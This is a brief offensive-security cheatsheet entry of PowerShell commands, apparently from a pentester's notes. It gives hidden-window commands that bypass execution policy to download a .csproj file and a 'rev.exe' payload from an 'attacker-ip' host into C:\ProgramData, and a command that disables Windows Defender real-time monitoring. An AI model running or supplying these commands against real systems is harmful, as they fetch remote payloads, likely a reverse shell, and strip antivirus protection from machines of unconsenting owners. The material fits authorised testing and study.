---
id: c06861a5-b9ae-4213-8788-c2652ddc8364
name: powershell
type: cheatsheet
verified: false
created_at: '2020-07-14T18:15:05.521037+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# powershell



**Command** ([[powershell upload]]):

```powershell
powershell Invoke-WebRequest "http://attacker-ip:81/x41.csproj" -OutFile "C:\ProgramData\x41.csproj"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://attacker-ip/rev.exe', 'C:\ProgramData\')"

```







**Command** ([[powershell disable av]]):

```bash
Set-MpPreference -DisableRealtimeMonitoring $true

```






